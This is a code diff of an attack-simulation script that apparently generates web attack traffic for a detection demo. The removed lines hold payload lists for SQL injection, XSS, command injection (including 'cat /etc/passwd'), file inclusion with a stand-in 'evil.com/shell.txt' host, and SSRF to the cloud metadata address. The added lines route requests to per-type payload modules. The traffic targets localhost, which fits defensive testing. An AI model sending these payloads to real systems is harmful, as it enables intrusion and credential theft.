@@ -1,143 +1,65 @@
-# tools/attack_generator.py
+"""
+tools/attack_generator.py — Attack simulation orchestrator
 
-import requests
-import time
+generate_attack(attack_type) -> (url_payload, body_payload)
+
+Dispatches to the appropriate per-type module.
+Used by /api/demo/simulate FastAPI endpoint.
+"""
+
 import random
-import urllib.parse
+from typing import Tuple
 
-BASE_URL = "http://localhost"
-DELAY = 0.25
 
-def enc(x):
-    return urllib.parse.quote(x, safe="")
+def generate_attack(attack_type: str) -> Tuple[str, str]:
+    """
+    Generate a realistic attack payload for the given attack type.
 
-def send_get(path, params=None):
-    try:
-        requests.get(f"{BASE_URL}{path}", params=params, timeout=3)
-    except Exception:
-        pass
-    time.sleep(DELAY)
+    Args:
+        attack_type: One of sqli, xss, cmdi, lfi, rfi, ssrf,
+                     path_traversal (case-insensitive)
 
-def send_post(path, data=None):
-    try:
-        requests.post(f"{BASE_URL}{path}", data=data, timeout=3)
-    except Exception:
-        pass
-    time.sleep(DELAY)
+    Returns:
+        (url_with_payload, raw_payload_string)
+    """
+    key = attack_type.lower().strip().replace("-", "_").replace(" ", "_")
 
-# ---------------- NORMAL ----------------
+    if key in ("sqli", "sql_injection", "sql"):
+        from tools.sqli_atk import generate
+    elif key in ("xss", "cross_site_scripting"):
+        from tools.xss_atk import generate
+    elif key in ("cmdi", "cmdi_injection", "command_injection", "rce"):
+        from tools.cmdi_atk import generate
+    elif key in ("lfi", "local_file_inclusion"):
+        from tools.lfi_atk import generate
+    elif key in ("rfi", "remote_file_inclusion"):
+        from tools.rfi_atk import generate
+    elif key in ("ssrf", "server_side_request_forgery"):
+        from tools.ssrf_atk import generate
+    elif key in ("path_traversal", "patht", "traversal", "directory_traversal"):
+        from tools.pathT_atk import generate
+    else:
+        raise ValueError(
+            f"Unknown attack type: '{attack_type}'. "
+            f"Valid types: sqli, xss, cmdi, lfi, rfi, ssrf, path_traversal"
+        )
 
-def normal():
-    send_get("/home")
-    send_get("/products", {"id": str(random.randint(1, 100))})
-    send_post("/contact", {"msg": "hello world"})
+    return generate()
 
-# ---------------- SQLi ----------------
 
-SQLI_PAYLOADS = [
-    "1 OR 1=1",
-    "1' OR '1'='1",
-    "1 UNION SELECT username,password FROM users",
-    "1 AND SLEEP(5)",
-    "1' AND 'a'='a"
-]
+def random_attack() -> Tuple[str, str, str]:
+    """Return (attack_type, url, body) for a randomly chosen attack type."""
+    attack_types = ["sqli", "xss", "cmdi", "lfi", "rfi", "ssrf", "path_traversal"]
+    chosen = random.choice(attack_types)
+    url, body = generate_attack(chosen)
+    return chosen, url, body
 
-def sqli():
-    p = (random.choice(SQLI_PAYLOADS))
-    send_get("/search", {"id": p})
-    send_post("/login", {"user": "admin", "pass": p})
-
-# ---------------- XSS ----------------
-
-XSS_PAYLOADS = [
-    "<script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "<svg/onload=alert(1)>"
-]
-
-def xss():
-    p = (random.choice(XSS_PAYLOADS))
-    send_get("/search", {"q": p})
-    send_post("/comment", {"text": p})
-
-# ---------------- CMDi ----------------
-
-CMD_PAYLOADS = [
-    "ls;whoami",
-    "id && whoami",
-    "cat /etc/passwd | id",
-    "ping -c 1 127.0.0.1 && id"
-]
-
-def cmdi():
-    p = (random.choice(CMD_PAYLOADS))
-    send_get("/exec", {"cmd": p})
-    send_post("/exec", {"cmd": p})
-
-# ---------------- LFI ----------------
-
-LFI_PAYLOADS = [
-    "/etc/passwd",
-    "../../etc/passwd",
-    "..%2f..%2fetc%2fpasswd",
-    "..\\..\\windows\\system32\\drivers\\etc\\hosts"
-]
-
-def lfi():
-    p = random.choice(LFI_PAYLOADS)
-    send_get("/get", {"file": p})
-
-# ---------------- RFI ----------------
-
-RFI_PAYLOADS = [
-    "http://example.com/test.txt",
-    "https://evil.com/shell.txt"
-]
-
-def rfi():
-    send_get("/load", {"file": (random.choice(RFI_PAYLOADS))})
-
-# ---------------- SSRF ----------------
-
-SSRF_PAYLOADS = [
-    "http://127.0.0.1/admin",
-    "http://localhost:8080",
-    "http://169.254.169.254/latest/meta-data/"
-]
-
-def ssrf():
-    send_get("/test", {"url": (random.choice(SSRF_PAYLOADS))})
-
-# ---------------- MAIN ----------------
 
 if __name__ == "__main__":
-
-    print("[*] Normal traffic")
-    for _ in range(10):
-        normal()
-
-    print("[*] SQL Injection")
-    for _ in range(10):
-        sqli()
-
-    print("[*] XSS")
-    for _ in range(10):
-        xss()
-
-    print("[*] Command Injection")
-    for _ in range(10):
-        cmdi()
-
-    print("[*] LFI / Traversal")
-    for _ in range(10):
-        lfi()
-
-    print("[*] RFI")
-    for _ in range(10):
-        rfi()
-
-    print("[*] SSRF")
-    for _ in range(10):
-        ssrf()
-
-    print("[+] Attack generation finished cleanly")
+    """Quick self-test — generate one payload per attack type."""
+    types = ["sqli", "xss", "cmdi", "lfi", "rfi", "ssrf", "path_traversal"]
+    print("\n── Attack Generator Self-Test ──\n")
+    for t in types:
+        url, body = generate_attack(t)
+        print(f"{t:20s} → {url[:90]}")
+    print()
